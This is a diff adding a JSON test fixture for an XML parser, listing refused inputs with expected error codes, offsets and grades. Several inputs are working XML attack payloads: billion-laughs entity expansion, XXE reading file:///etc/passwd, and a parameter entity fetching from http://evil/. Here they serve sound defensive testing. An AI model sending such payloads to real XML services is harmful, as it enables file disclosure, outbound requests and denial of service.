@@ -1,0 +1,17 @@
+{
+  "description": "Refused features: DTD internal subsets and external identifiers (XXE, billion laughs) and encodings other than UTF-8/UTF-16. All grade unsupported, reported at the first offending byte.",
+  "cases": [
+    {"name": "billion laughs", "input": "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;\">]><lolz>&lol2;</lolz>", "error": "dtd_internal_subset", "offset": 36, "grade": "unsupported"},
+    {"name": "XXE via SYSTEM", "input": "<!DOCTYPE foo SYSTEM \"file:///etc/passwd\"><foo/>", "error": "dtd_external_id", "offset": 14, "grade": "unsupported"},
+    {"name": "XXE via PUBLIC", "input": "<!DOCTYPE foo PUBLIC \"-//X//EN\" \"http://x/y.dtd\"><foo/>", "error": "dtd_external_id", "offset": 14, "grade": "unsupported"},
+    {"name": "internal subset after space", "input": "<!DOCTYPE foo   [ ]><foo/>", "error": "dtd_internal_subset", "offset": 16, "grade": "unsupported"},
+    {"name": "parameter entity attempt", "input": "<!DOCTYPE x [<!ENTITY % p SYSTEM \"http://evil/\"> %p;]><x/>", "error": "dtd_internal_subset", "offset": 12, "grade": "unsupported"},
+    {"name": "undefined entity without DTD", "input": "<x>&xxe;</x>", "error": "undefined_entity", "offset": 7, "grade": "failed"},
+    {"name": "latin1 declaration refused at first non-matching byte", "input": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><a/>", "error": "unsupported_encoding", "offset": 30, "grade": "unsupported"},
+    {"name": "utf-8 prefix then wrong", "input": "<?xml version=\"1.0\" encoding=\"utf-7\"?><a/>", "error": "unsupported_encoding", "offset": 34, "grade": "unsupported"},
+    {"name": "utf-8 lower case accepted", "input": "<?xml version=\"1.0\" encoding=\"utf-8\"?><a/>", "canonical": "<a></a>", "grade": "complete"},
+    {"name": "utf-16 declared in utf-8 input", "input": "<?xml version=\"1.0\" encoding=\"UTF-16\"?><a/>", "error": "unsupported_encoding", "offset": 34, "grade": "unsupported"},
+    {"name": "utf-16 without BOM", "input_hex": "3c003f0078006d006c00", "error": "unsupported_encoding", "offset": 1, "grade": "unsupported"},
+    {"name": "utf-16 unpaired surrogate", "input_hex": "fffe3c00610000d83e00", "error": "invalid_utf8", "grade": "failed"}
+  ]
+}
